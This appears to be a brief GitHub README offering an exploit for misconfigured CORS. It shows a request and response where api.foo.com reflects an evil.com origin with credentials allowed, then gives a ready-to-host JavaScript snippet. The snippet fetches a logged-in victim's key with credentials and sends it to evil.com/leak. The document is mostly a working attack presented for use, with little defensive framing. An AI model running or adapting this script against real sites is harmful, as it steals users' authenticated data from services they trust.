# Exploit-Cors-Examples
Examples to exploit miss configured Cors

# Exploit Missconfigured CORS

## Allow credencials trye
When you have the access is granted to any "domain" because
because of the header "Access-Control-Allow-Credentials: true" like the request above:

```
Request

GET /key HTTP/1.1
Host: api.foo.com
Accept: */*
Origin: https://www.evil.com
Connection: close

++++++++++++++++++++++++
Response

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://www.evil.com
Access-Control-Allow-Credentials: true

{"[key]"}
```

## Exploit Allow Credencials true

Just place the code below to any domain that you have control.

```javascript
<script>
var xhr = new XMLHttpRequest(); 
xhr.onload = reqListener; 
xhr.open('GET','https://api.foo.com/key/',true); 
xhr.withCredentials = true;
xhr.send();

<!-- leak response evil -->
function reqListener() {
    location='https://evil.com/leak?key='+this.responseText; 
};
</script>
```
